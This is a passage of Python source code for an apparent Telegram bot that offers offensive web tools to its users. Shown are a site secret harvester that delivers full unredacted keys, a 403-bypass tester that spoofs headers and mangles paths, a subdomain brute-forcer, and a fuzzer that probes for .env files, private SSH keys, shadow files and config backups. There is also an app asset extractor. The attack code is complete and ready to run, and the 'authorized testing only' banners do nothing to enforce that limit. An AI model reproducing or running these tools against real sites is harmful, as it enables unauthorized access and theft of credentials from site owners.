        zf.writestr("report.json", report_json.encode('utf-8'))
        # README
        _js_count     = sum(1 for f in sources if f.startswith("js/"))
        _inline_count = sum(1 for f in sources if f.startswith("inline_scripts/"))
        readme = (
            f"EXTRACT SCAN — {domain}\n"
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"CONTENTS\n"
            f"  sources/index.html           — Raw HTML page\n"
            f"  sources/js/                  — External JS files ({_js_count} files)\n"
            f"  sources/inline_scripts/      — Inline <script> blocks ({_inline_count} blocks)\n"
            f"  report.txt                   — Human-readable findings (FULL values)\n"
            f"  report.json                  — Machine-readable JSON report\n\n"
            f"FINDINGS: {len(findings)} total  "
            f"(Critical:{critical} High:{high} Medium:{med})\n"
        )
        zf.writestr("README.txt", readme.encode('utf-8'))

    zip_buffer.seek(0)
    zip_size_mb = zip_buffer.getbuffer().nbytes / 1024 / 1024

    # ── Send Telegram summary (redacted) ────────────────
    if findings:
        tg_lines = [
            f"🚨 *{len(findings)} Secret(s) Found — `{domain}`*",
            f"🔴 Critical: `{critical}` | 🟠 High: `{high}` | 🟡 Medium: `{med}`",
            f"📂 Scanned: `{len(sources)}` files\n",
        ]
        for f in findings[:15]:
            tg_lines.append(
                f"{f['risk']} *{f['type']}*\n"
                f"   Value: `{f['value_redacted']}`\n"
                f"   File:  `{f['file']}`  Line `{f['line']}`"
            )
        if len(findings) > 15:
            tg_lines.append(f"\n_…and {len(findings)-15} more — see ZIP report_")
        tg_lines.append("\n⚠️ _Telegram: values redacted. Full values in ZIP report._")
    else:
        tg_lines = [
            f"✅ *No Secrets Found*",
            f"🔗 `{domain}`",
            f"📂 Sources scanned: `{len(sources)}` files",
            f"🔍 Patterns checked: `{len(_SECRET_PATTERNS)}`",
            f"\n_ZIP contains all raw source files for manual review._",
        ]

    tg_text = "\n".join(tg_lines)
    try:
        if len(tg_text) > 4000:
            await msg.edit_text(tg_text[:4000], parse_mode='Markdown')
        else:
            await msg.edit_text(tg_text, parse_mode='Markdown')
    except Exception:
        pass

    # ── Send ZIP ─────────────────────────────────────────
    cap = (
        f"📦 *Extract ZIP — `{domain}`*\n"
        f"🔍 `{len(sources)}` source files | `{len(findings)}` findings\n"
        f"🔴`{critical}` 🟠`{high}` 🟡`{med}` | 💾 `{zip_size_mb:.2f} MB`\n\n"
        f"📄 `report.txt` — full unredacted values\n"
        f"📋 `report.json` — machine-readable\n"
        f"📁 `sources/` — raw HTML + JS files"
    )
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=zip_buffer,
            filename=zip_name,
            caption=cap,
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"❌ ZIP send error: `{type(e).__name__}: {str(e)[:60]}`",
            parse_mode='Markdown'
        )



# ══════════════════════════════════════════════════
# 🔓  /bypass403 — 403 Forbidden Bypass Tester
# ══════════════════════════════════════════════════

_BYPASS_HEADERS = [
    {"X-Original-URL":             "{path}"},
    {"X-Rewrite-URL":              "{path}"},
    {"X-Custom-IP-Authorization":  "127.0.0.1"},
    {"X-Forwarded-For":            "127.0.0.1"},
    {"X-Forwarded-For":            "localhost"},
    {"X-Remote-IP":                "127.0.0.1"},
    {"X-Remote-Addr":              "127.0.0.1"},
    {"X-Host":                     "localhost"},
    {"X-Real-IP":                  "127.0.0.1"},
    {"X-ProxyUser-Ip":             "127.0.0.1"},
    {"Referer":                    "{url}"},
    {"X-Originating-IP":           "127.0.0.1"},
    {"True-Client-IP":             "127.0.0.1"},
    {"Client-IP":                  "127.0.0.1"},
    {"CF-Connecting-IP":           "127.0.0.1"},
    {"Forwarded":                  "for=127.0.0.1"},
    {"X-Frame-Options":            "Allow"},
    {"X-WAF-Bypass":               "1"},
    {"X-Bypass":                   "1"},
    {"Authorization":              "Bearer null"},
]

_BYPASS_PATH_VARIANTS = [
    "{path}",
    "{path}/",
    "{path}//",
    "{path}/.",
    "{path}/..",
    "/{path_no_slash}%20",
    "/{path_no_slash}%09",
    "/{path_no_slash}%00",
    "/{path_no_slash}..;/",
    "/{path_no_slash};/",
    "/{path_no_slash}?",
    "//{path_no_slash}",
    "/{path_upper}",
    "/{path_lower}",
    "{path_dot_slash}",
]

_BYPASS_METHODS = ["POST", "PUT", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]

def _bypass_sync(url: str) -> list:
    """Run all 403 bypass techniques against a URL."""
    parsed     = urlparse(url)
    path       = parsed.path or "/"
    path_clean = path.lstrip("/")
    base       = f"{parsed.scheme}://{parsed.netloc}"
    results    = []


    def _probe(test_url: str, extra_headers: dict = None, method: str = "GET",
               label: str = "") -> dict | None:
        try:
            h = dict(_get_headers())
            if extra_headers:
                # Resolve {path} / {url} placeholders in header values
                for k, v in extra_headers.items():
                    v = v.replace("{path}", path).replace("{url}", url)
                    h[k] = v
            r = requests.request(
                method, test_url, headers=h,
                timeout=8, verify=False,
                allow_redirects=False,
                proxies=proxy_manager.get_proxy()
            )
            return {
                "url":    test_url,
                "method": method,
                "status": r.status_code,
                "size":   len(r.content),
                "label":  label,
                "headers": dict(r.headers),
            }
        except Exception:
            return None

    # ── Baseline: confirm it's actually 403 ────────
    baseline = _probe(url, label="baseline")
    if not baseline:
        return []
    results.append({**baseline, "technique": "Baseline"})
    baseline_status = baseline["status"]
    baseline_size   = baseline["size"]

    def _is_bypass(r: dict) -> bool:
        if not r:
            return False
        st = r["status"]
        # Success: 200/201/204/301/302 when baseline was 403/401
        if baseline_status in (403, 401):
            if st in (200, 201, 204, 301, 302):
                return True
            # Different size even on 403 might indicate WAF bypass
            if st == baseline_status and abs(r["size"] - baseline_size) > 500:
                return True
        return False

    # ── Header manipulation ──────────────────────────
    for hdr_template in _BYPASS_HEADERS:
        hdrs = {}
        for k, v in hdr_template.items():
            hdrs[k] = v.replace("{path}", path).replace("{url}", url)
        label = "Header: " + ", ".join(f"{k}: {v}" for k, v in hdr_template.items())
        r = _probe(url, hdrs, label=label)
        if r:
            r["technique"] = "header_manipulation"
            results.append(r)

    # ── Path variants ────────────────────────────────
    path_variants = [
        (f"{base}{path}/",                    "path/"),
        (f"{base}{path}//",                   "path//"),
        (f"{base}{path}/.",                   "path/."),
        (f"{base}/{path_clean}%20",           "url_encode_space"),
        (f"{base}/{path_clean}%09",           "url_encode_tab"),
        (f"{base}/{path_clean}%00",           "null_byte"),
        (f"{base}/{path_clean}..;/",          "path_dotdot"),
        (f"{base}/{path_clean};/",            "semicolon"),
        (f"{base}//{path_clean}",             "double_slash"),
        (f"{base}/{path_clean.upper()}",      "uppercase"),
        (f"{base}/{path_clean.lower()}",      "lowercase"),
        (f"{base}/{path_clean}?anything",     "query_append"),
        (f"{base}/{path_clean}#",             "fragment"),
        (f"{base}/./{ path_clean}",           "dot_prefix"),
        (f"{base}/{path_clean}/..",           "dotdot_suffix"),
    ]
    for test_url, label in path_variants:
        safe_ok, _ = is_safe_url(test_url)
        if not safe_ok:
            continue
        r = _probe(test_url, label=label)
        if r:
            r["technique"] = "path_variant"
            results.append(r)

    # ── HTTP method override ─────────────────────────
    for method in _BYPASS_METHODS:
        r = _probe(url, method=method, label=f"Method: {method}")
        if r:
            r["technique"] = "method_override"
            results.append(r)

    # ── Method override via header ───────────────────
    for method in ["GET", "POST", "PUT", "DELETE"]:
        r = _probe(url,
                   extra_headers={"X-HTTP-Method-Override": method,
                                  "X-Method-Override": method},
                   label=f"X-HTTP-Method-Override: {method}")
        if r:
            r["technique"] = "method_override_header"
            results.append(r)

    # ── Content-Type tricks ──────────────────────────
    for ct in ["application/json", "text/xml", "application/x-www-form-urlencoded"]:
        r = _probe(url, extra_headers={"Content-Type": ct, "Content-Length": "0"},
                   method="POST", label=f"POST Content-Type: {ct}")
        if r:
            r["technique"] = "content_type"
            results.append(r)

    # Tag bypasses
    for res in results:
        res["bypassed"] = _is_bypass(res)

    return results


async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/bypass403 <url> — Test 403 Forbidden bypass techniques"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/bypass403 https://example.com/admin`\n\n"
            "🔓 *Tests 50+ bypass techniques:*\n"
            "  • Header manipulation (X-Original-URL, X-Forwarded-For...)\n"
            "  • Path normalization variants (/admin/, /ADMIN, /admin/..)\n"
            "  • HTTP method override (POST, PUT, OPTIONS...)\n"
            "  • X-HTTP-Method-Override header\n"
            "  • Content-Type tricks\n"
            "  • URL encoding bypass (%20, %09, %00)\n\n"
            "⚠️ _For authorized security testing only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname
    path   = urlparse(url).path or "/"

    msg = await update.effective_message.reply_text(
        f"🔓 *Bypass Testing — `{domain}`*\n"
        f"Path: `{path}`\n\n"
        "Running 50+ bypass techniques...\n⏳",
        parse_mode='Markdown'
    )

    try:
        results = await asyncio.to_thread(_bypass_sync, url)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    baseline    = next((r for r in results if r.get("technique") == "Baseline"), None)
    baseline_st = baseline["status"] if baseline else "?"
    bypasses    = [r for r in results if r.get("bypassed")]
    tested      = len(results) - 1   # exclude baseline

    lines = [
        f"🔓 *Bypass Results — `{path}`*",
        f"🌐 `{domain}` | Baseline: `{baseline_st}`",
        f"🧪 Tested: `{tested}` techniques | ✅ Bypassed: `{len(bypasses)}`\n",
    ]

    if not bypasses:
        lines.append("🔒 No bypasses found — endpoint is well-protected.")
    else:
        lines.append(f"*🚨 {len(bypasses)} Bypass(es) Found:*")
        for b in bypasses[:15]:
            st_icon = "✅" if b["status"] in (200,201,204) else "↪️"
            lines.append(
                f"  {st_icon} `{b['status']}` [{b['method']}] `{b['label'][:55]}`"
            )
            if b["status"] in (301, 302):
                loc = b.get("headers", {}).get("Location", "")
                if loc:
                    lines.append(f"      → `{loc[:60]}`")

    # ── Summary by technique type ────────────────────
    tech_counts = {}
    for b in bypasses:
        t = b.get("technique", "other")
        tech_counts[t] = tech_counts.get(t, 0) + 1
    if tech_counts:
        lines.append("\n*By technique:*")
        for t, c in sorted(tech_counts.items(), key=lambda x: -x[1]):
            lines.append(f"  • `{t}`: {c}")

    lines.append("\n⚠️ _Authorized testing only._")

    # ── Export JSON if bypasses found ────────────────
    if bypasses:
        import io
        report = json.dumps({
            "url": url, "baseline_status": baseline_st,
            "tested": tested, "bypasses_found": len(bypasses),
            "bypass_details": [{
                "label": b["label"], "method": b["method"],
                "status": b["status"], "size": b["size"],
                "technique": b["technique"],
                "location": b.get("headers",{}).get("Location",""),
            } for b in bypasses],
            "all_results": [{
                "label": r["label"], "method": r["method"],
                "status": r["status"], "size": r["size"],
            } for r in results],
        }, indent=2)
        buf = io.BytesIO(report.encode())
        try:
            await msg.edit_text("\n".join(lines), parse_mode='Markdown')
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=buf,
                filename=f"bypass403_{domain}_{ts}.json",
                caption=f"🔓 Bypass report — `{domain}` — `{len(bypasses)}` bypasses",
                parse_mode='Markdown'
            )
        except Exception:
            await update.effective_message.reply_text("\n".join(lines)[:4000], parse_mode='Markdown')
    else:
        await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 📡  /subdomains — Advanced Subdomain Enumerator
# ══════════════════════════════════════════════════

_SUBDOMAIN_WORDLIST = [
    "www","mail","smtp","pop","imap","ftp","sftp","ssh","vpn","remote",
    "api","api2","api3","dev","dev2","staging","stage","beta","alpha","test",
    "admin","administrator","portal","panel","dashboard","manage","manager",
    "blog","shop","store","pay","payment","billing","invoice","checkout",
    "app","apps","mobile","m","wap","static","assets","cdn","media","img",
    "images","uploads","files","docs","docs2","help","support","kb","wiki",
    "status","monitor","grafana","prometheus","kibana","elastic","jenkins",
    "git","gitlab","github","bitbucket","jira","confluence","redmine",
    "internal","intranet","corp","corporate","private","secure","ssl",
    "login","auth","sso","oauth","id","identity","account","accounts",
    "db","database","mysql","postgres","redis","mongo","memcache","cache",
    "backup","old","legacy","v1","v2","v3","new","next","preview",
    "sandbox","demo","lab","labs","research","data","analytics","stats",
    "mx","mx1","mx2","ns","ns1","ns2","ns3","dns","dns1","dns2",
    "web","web1","web2","web3","server","server1","host","node","node1",
    "cloud","aws","azure","gcp","heroku","k8s","kubernetes","docker",
    "ci","cd","build","deploy","ops","devops","infra","infrastructure",
    "us","eu","asia","uk","au","jp","de","fr","ca","in","br",
    "prod","production","live","uat","qa","qas","rc","release",
    "autodiscover","autoconfig","cpanel","whm","plesk","webmail",
    "forum","forums","community","social","chat","slack","meet",
    "careers","jobs","press","news","events","about","contact",
]

def _subdomains_sync(domain: str, progress_q: list) -> dict:
    """Enumerate subdomains via crt.sh + DNS brute-force + HackerTarget."""
    results      = {"crtsh": [], "bruteforce": [], "hackertarget": [], "errors": []}
    found_all    = set()


    # ── Source 1: crt.sh (Certificate Transparency) ─
    progress_q.append("🔍 Querying crt.sh (Certificate Transparency)...")
    try:
        r = requests.get(
            f"https://crt.sh/?q=%.{domain}&output=json",
            timeout=15, headers={"Accept": "application/json"}
        )
        if r.status_code == 200:
            seen = set()
            for entry in r.json():
                names = entry.get("name_value", "").split("\n")
                for name in names:
                    name = name.strip().lower().lstrip("*.")
                    if name.endswith(f".{domain}") or name == domain:
                        sub = name.replace(f".{domain}", "").replace(domain, "")
                        if sub and sub not in seen and len(sub) < 60:
                            seen.add(sub)
                            results["crtsh"].append(name)
                            found_all.add(name)
            progress_q.append(f"✅ crt.sh: `{len(results['crtsh'])}` subdomains found")
    except Exception as e:
        results["errors"].append(f"crt.sh: {e}")

    # ── Source 2: HackerTarget API (free) ────────────
    progress_q.append("🔍 Querying HackerTarget API...")
    try:
        r = requests.get(
            f"https://api.hackertarget.com/hostsearch/?q={domain}",
            timeout=12
        )
        if r.status_code == 200 and "error" not in r.text.lower()[:30]:
            for line in r.text.strip().split("\n"):
                if "," in line:
                    hostname = line.split(",")[0].strip().lower()
                    if hostname.endswith(f".{domain}"):
                        found_all.add(hostname)
                        results["hackertarget"].append(hostname)
            progress_q.append(f"✅ HackerTarget: `{len(results['hackertarget'])}` found")
    except Exception as e:
        results["errors"].append(f"HackerTarget: {e}")

    # ── Source 3: DNS Brute-force ────────────────────
    progress_q.append(f"🔍 DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)...")
    live_subs  = []
    wildcard_ip = None

    # Wildcard detection
    try:
        wc_ip = socket.gethostbyname(f"thissubdomaindoesnotexist99.{domain}")
        wildcard_ip = wc_ip
        progress_q.append(f"⚠️ Wildcard DNS detected (`{wc_ip}`) — filtering...")
    except socket.gaierror:
        pass

    def _check_sub(word):
        hostname = f"{word}.{domain}"
        try:
            ip = socket.gethostbyname(hostname)
            # Filter wildcard
            if wildcard_ip and ip == wildcard_ip:
                return None
            return (hostname, ip)
        except socket.gaierror:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
        futs = {ex.submit(_check_sub, w): w for w in _SUBDOMAIN_WORDLIST}
        done = 0
        for fut in concurrent.futures.as_completed(futs, timeout=45):
            done += 1
            if done % 50 == 0:
                progress_q.append(f"🔍 Brute-force: `{done}/{len(_SUBDOMAIN_WORDLIST)}` tested | `{len(live_subs)}` live")
            try:
                res = fut.result(timeout=4)
                if res:
                    hostname, ip = res
                    live_subs.append({"hostname": hostname, "ip": ip})
                    found_all.add(hostname)
            except Exception:
                pass

    results["bruteforce"] = live_subs
    progress_q.append(f"✅ Brute-force: `{len(live_subs)}` live subdomains")

    # ── Deduplicate and resolve all found ────────────
    all_unique = sorted(found_all)
    resolved   = {}
    for h in all_unique[:100]:
        try:
            resolved[h] = socket.gethostbyname(h)
        except Exception:
            resolved[h] = "unresolved"

    results["all_unique"]    = all_unique
    results["resolved"]      = resolved
    results["total_unique"]  = len(all_unique)
    results["wildcard_detected"] = wildcard_ip is not None

    return results


async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/subdomains <domain> — Advanced subdomain enumeration"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/subdomains example.com`\n\n"
            "📡 *3 sources combined:*\n"
            "  ① crt.sh — Certificate Transparency logs (passive)\n"
            "  ② HackerTarget API — public dataset\n"
            f"  ③ DNS brute-force — {len(_SUBDOMAIN_WORDLIST)} wordlist\n\n"
            "🛡 Wildcard DNS auto-detection & filtering\n"
            "📦 Exports full list as `.txt` + `.json` files",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    raw = context.args[0].strip().replace("https://","").replace("http://","").split("/")[0].lower()

    # Basic domain validation
    if not re.match(r'^[a-z0-9][a-z0-9\-.]+\.[a-z]{2,}$', raw):
        await update.effective_message.reply_text("❌ Invalid domain format. Example: `example.com`", parse_mode='Markdown')
        return

    # SSRF: block private IPs for the apex domain
    try:
        apex_ip = socket.gethostbyname(raw)
        if not _is_safe_ip(apex_ip):
            await update.effective_message.reply_text(f"🚫 Private IP blocked: `{apex_ip}`", parse_mode='Markdown')
            return
    except socket.gaierror:
        pass  # domain may not have A record — still continue

    msg = await update.effective_message.reply_text(
        f"📡 *Subdomain Enumeration — `{raw}`*\n\n"
        f"① crt.sh (CT logs)\n② HackerTarget API\n"
        f"③ DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)\n\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(4)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"📡 *Enumerating `{raw}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        data = await asyncio.to_thread(_subdomains_sync, raw, progress_q)
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    total    = data["total_unique"]
    resolved = data["resolved"]
    crtsh_c  = len(data["crtsh"])
    ht_c     = len(data["hackertarget"])
    bf_c     = len(data["bruteforce"])
    wc       = data["wildcard_detected"]

    lines = [
        f"📡 *Subdomain Enumeration — `{raw}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"🔎 Total unique: `{total}`",
        f"  crt.sh:       `{crtsh_c}`",
        f"  HackerTarget: `{ht_c}`",
        f"  Brute-force:  `{bf_c}` live",
        f"{'⚠️ Wildcard DNS detected & filtered' if wc else '✅ No wildcard DNS'}\n",
    ]

    # Show top results
    if data["all_unique"]:
        lines.append("*Found Subdomains:*")
        for h in data["all_unique"][:30]:
            ip = resolved.get(h, "?")
            # Flag interesting ones
            flag = ""
            for keyword in ("dev","staging","admin","internal","test","beta","old","backup","api"):
                if keyword in h:
                    flag = " 🔴"
                    break
            lines.append(f"  `{h}` → `{ip}`{flag}")
        if total > 30:
            lines.append(f"  _…and {total-30} more in export file_")

    lines.append("\n📦 _Full list exported below_")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    # ── Export files ──────────────────────────────────
    import io
    txt_content  = "\n".join(
        f"{h}\t{resolved.get(h,'?')}" for h in data["all_unique"]
    )
    json_content = json.dumps({
        "domain": raw, "scanned_at": datetime.now().isoformat(),
        "total_unique": total, "wildcard_detected": wc,
        "sources": {"crtsh": crtsh_c, "hackertarget": ht_c, "bruteforce": bf_c},
        "subdomains": [{
            "hostname": h, "ip": resolved.get(h,"?"),
            "interesting": any(k in h for k in ("dev","staging","admin","internal","test","backup","api"))
        } for h in data["all_unique"]],
    }, indent=2)

    import zipfile as _zf2
    zip_buf = io.BytesIO()
    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d  = re.sub(r'[^\w\-]', '_', raw)
    with _zf2.ZipFile(zip_buf, 'w', _zf2.ZIP_DEFLATED) as zf:
        zf.writestr("subdomains.txt",  txt_content.encode())
        zf.writestr("subdomains.json", json_content.encode())
        interesting = [h for h in data["all_unique"]
                       if any(k in h for k in ("dev","staging","admin","internal","test","backup","api"))]
        zf.writestr("interesting.txt", "\n".join(interesting).encode())
    zip_buf.seek(0)

    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=zip_buf,
        filename=f"subdomains_{safe_d}_{ts}.zip",
        caption=(
            f"📡 *Subdomains — `{raw}`*\n"
            f"Total: `{total}` | Interesting: `{len(interesting)}`\n"
            f"Files: `subdomains.txt` + `interesting.txt` + `subdomains.json`"
        ),
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 🧪  /fuzz — HTTP Path & Parameter Fuzzer
# ══════════════════════════════════════════════════

_FUZZ_PATHS = [
    # Hidden admin / debug
    "admin","administrator","admin.php","admin/login","login","login.php",
    "dashboard","panel","control","manage","manager","cpanel","wp-admin",
    "debug","test","testing","dev","development","staging","beta","old",
    # Backup files
    "backup","backup.zip","backup.sql","dump.sql","db.sql","site.zip",
    "index.php.bak","index.html.bak","config.php.bak",".env",".env.bak",
    ".env.example",".env.local",".env.production",
    # Info disclosure
    "info.php","phpinfo.php","server-info","server-status","status",
    "health","ping","version","api/version","build","trace",
    # Source leaks
    ".git","git/config",".svn","web.config",".htaccess","crossdomain.xml",
    "robots.txt","sitemap.xml","humans.txt","security.txt",
    ".well-known/security.txt","readme.md","README.md","CHANGELOG.md",
    # CMS paths
    "wp-login.php","wp-config.php","xmlrpc.php","wp-json",
    "joomla","wp-content/debug.log","config/database.yml",
    "configuration.php","config.php","config.yml","config.json",
    "settings.py","database.yml","credentials.json","secrets.json",
    # API
    "api","api/v1","api/v2","api/v3","api/users","api/admin","graphql",
    "swagger.json","openapi.json","api-docs","redoc","swagger-ui.html",
    # Logs
    "error.log","access.log","debug.log","app.log","laravel.log",
    "storage/logs/laravel.log","logs/error.log","var/log/app.log",
    # Common uploads/files
    "uploads","files","static","assets","media","public",
    "download","downloads","export","exports","report","reports",
    # Framework specific
    "actuator","actuator/health","actuator/env","actuator/mappings",
    "metrics","prometheus","grafana","kibana","phpmyadmin","adminer.php",
    # Common hidden files
    "id_rsa","id_rsa.pub","authorized_keys","known_hosts",
    "passwd","shadow","hosts","resolv.conf",
]

_FUZZ_PARAMS = [
    "id","user","username","email","file","path","page","url","redirect",
    "next","return","callback","debug","test","admin","token","key","secret",
    "cmd","exec","command","query","search","q","type","action","method",
    "format","output","lang","language","locale","theme","template","view",
    "include","require","load","src","source","data","payload","input",
    "name","pass","password","hash","sig","signature","auth","session",
    "api_key","access_token","refresh_token","client_id","client_secret",
]

def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
    """Improved fuzzer — tech-aware + backup ext + param + response diff."""
    found = []

    # Baseline fingerprint
    try:
        r404 = requests.get(
            base.rstrip("/") + "/this_path_will_never_exist_xyz_abc_123",
            timeout=6, verify=False, headers=_get_headers(),
            proxies=proxy_manager.get_proxy()
        )
        baseline_status = r404.status_code
        baseline_size   = len(r404.content)
        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
        baseline_words  = len(r404.text.split()) if r404.text else 0
    except Exception:
        baseline_status, baseline_size, baseline_hash, baseline_words = 404, 0, "", 0

    def _is_interesting(r_status, r_size, r_hash, r_words):
        if r_status == baseline_status:
            if r_hash and r_hash == baseline_hash:
                return False
            if baseline_size > 0 and abs(r_size - baseline_size) < 50:
                return False
            if baseline_words > 0 and abs(r_words - baseline_words) < 5:
                return False
        return r_status in (200, 201, 204, 301, 302, 307, 401, 403, 500)

    def _probe(target_url):
        try:
            r = requests.get(
                target_url, timeout=5, verify=False,
                headers=_get_headers(), allow_redirects=True,
                stream=True, proxies=proxy_manager.get_proxy()
            )
            chunk = b""
            for part in r.iter_content(2048):
                chunk += part
                if len(chunk) >= 2048:
                    break
            r.close()
            r_size  = int(r.headers.get("Content-Length", len(chunk)))
            r_hash  = hashlib.md5(chunk[:512]).hexdigest()
            r_ct    = r.headers.get("Content-Type", "")[:40]
            r_words = len(chunk.decode("utf-8", "ignore").split())

            if _is_interesting(r.status_code, r_size, r_hash, r_words):
                gated = r.status_code in (401, 403)
                return {
                    "url":    target_url,
                    "status": r.status_code,
                    "size":   r_size,
                    "ct":     r_ct,
                    "gated":  gated,
                    "title":  "",
                }
        except Exception:
            pass
        return None

    if mode == "params":
        # Param fuzzing with multiple values
        targets = []
        for param, values in _SMART_FUZZ_PARAMS.items():
            for val in values[:2]:
                targets.append(f"{base}?{param}={val}")
        # Also original params
        for p in _FUZZ_PARAMS:
            targets.append(f"{base}?{p}=FUZZ")
    else:
        base_paths = list(_FUZZ_PATHS)
        # Tech-aware extras
        detected = _detect_tech_stack(base)
        if detected:
            progress_q.append(f"🔬 Detected: `{'`, `'.join(detected)}`")
        for tech in detected:
            base_paths.extend(_TECH_WORDLISTS.get(tech, []))

        # Backup extension permutations (on top 30 paths)
        backup_targets = []
        for path in base_paths[:30]:
            for ext in _BACKUP_EXTENSIONS:
                backup_targets.append(path.rstrip("/") + ext)

        targets = [f"{base.rstrip('/')}/{p}" for p in base_paths]
        targets += [f"{base.rstrip('/')}/{p}" for p in backup_targets]

    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, t): t for t in targets}
        for fut in concurrent.futures.as_completed(fmap, timeout=120):
            done += 1
            if done % 25 == 0:
                progress_q.append(
                    f"🧪 Fuzzing `{done}/{len(targets)}` | Found: `{len(found)}`"
                )
            try:
                res = fut.result(timeout=8)
                if res:
                    found.append(res)
            except Exception:
                pass

    # Sort: 200 first, then gated (401/403), then rest
    found.sort(key=lambda x: (x["status"] != 200, not x.get("gated"), x["status"]))
    return found, baseline_status


_ASSET_CATEGORIES = {
    "images":   {'.png','.jpg','.jpeg','.gif','.webp','.svg','.bmp','.ico','.avif'},
    "audio":    {'.mp3','.wav','.ogg','.aac','.flac','.m4a','.opus'},
    "video":    {'.mp4','.webm','.mkv','.avi','.mov','.m4v','.3gp'},
    "layouts":  {'.xml'},
    "dex":      {'.dex'},
    "so_libs":  {'.so'},
    "fonts":    {'.ttf','.otf','.woff','.woff2'},
    "certs":    {'.pem','.cer','.crt','.p12','.pfx','.keystore','.jks'},
    "configs":  {'.json','.yaml','.yml','.properties','.cfg','.conf','.ini'},
    "scripts":  {'.js','.py','.sh','.rb','.php'},
    "docs":     {'.pdf','.txt','.md','.html','.htm'},
    "archives": {'.zip','.tar','.gz','.rar','.7z'},
}

def _categorize_asset(filename: str) -> str:
    ext = os.path.splitext(filename.lower())[1]
    for cat, exts in _ASSET_CATEGORIES.items():
        if ext in exts:
            return cat
    return "other"

def _extract_apk_assets_sync(filepath: str, wanted_cats: set, progress_cb=None) -> dict:
    """Extract assets from APK/IPA/ZIP by category."""
    result = {"files": {}, "stats": {}, "errors": []}

    if not zipfile.is_zipfile(filepath):
        result["errors"].append("Not a valid ZIP/APK/IPA file")
        return result

    with zipfile.ZipFile(filepath, 'r') as zf:
        names = zf.namelist()
        total = len(names)
        categorized = {}
        for name in names:
            cat = _categorize_asset(name)
            if cat in wanted_cats:
                categorized.setdefault(cat, []).append(name)

        result["stats"]["total_files"] = total
        for cat, files in categorized.items():
            result["stats"][cat] = len(files)

        # Extract to BytesIO zip
        import io
        out_buf = io.BytesIO()
        extracted = 0
        MAX_EXTRACT = 200  # max files per export
        with zipfile.ZipFile(out_buf, 'w', zipfile.ZIP_DEFLATED) as out_zf:
            for cat in wanted_cats:
                files = categorized.get(cat, [])
                for i, fname in enumerate(files[:MAX_EXTRACT]):
                    try:
                        data = zf.read(fname)
                        # Flatten long paths
                        short_name = f"{cat}/{os.path.basename(fname)}"
                        out_zf.writestr(short_name, data)
                        extracted += 1
                        if progress_cb and extracted % 20 == 0:
                            progress_cb(f"📦 Extracting... `{extracted}` files")
                    except Exception as e:
                        result["errors"].append(f"{fname}: {e}")

        result["extracted"] = extracted
        result["zip_buffer"] = out_buf
    return result


async def cmd_appassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/appassets — Extract specific asset types from uploaded APK/IPA/ZIP"""
    uid = update.effective_user.id

    # Force join check
    if not await check_force_join(update, context):
        return

    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    # Check if user has a recently uploaded file
    async with db_lock:
        db = _load_db_sync()
    u = get_user(db, uid)
    last_app = u.get("last_uploaded_app")

    if not last_app or not os.path.exists(last_app):
        await update.effective_message.reply_text(
            "📦 *APK Asset Extractor*\n\n"
            "APK / IPA / ZIP / JAR ဖိုင်ကို ဦးစွာ Chat ထဲ Upload လုပ်ပါ\n"
            "Upload ပြီးရင် `/appassets` ကို ရိုက်ပြီး Category ရွေးပါ\n\n"
            "Extract လုပ်နိုင်သော Category များ:\n"
            "🖼 `images` — PNG, JPG, SVG, WebP\n"
            "🎵 `audio` — MP3, WAV, OGG, AAC\n"
            "🎬 `video` — MP4, WebM, MKV\n"
            "📐 `layouts` — XML Layout files\n"
            "⚙️ `dex` — classes.dex (bytecode)\n"
            "🔧 `so_libs` — .so Native libraries\n"
            "🔤 `fonts` — TTF, OTF, WOFF\n"
            "🔒 `certs` — PEM, CER, Keystores\n"
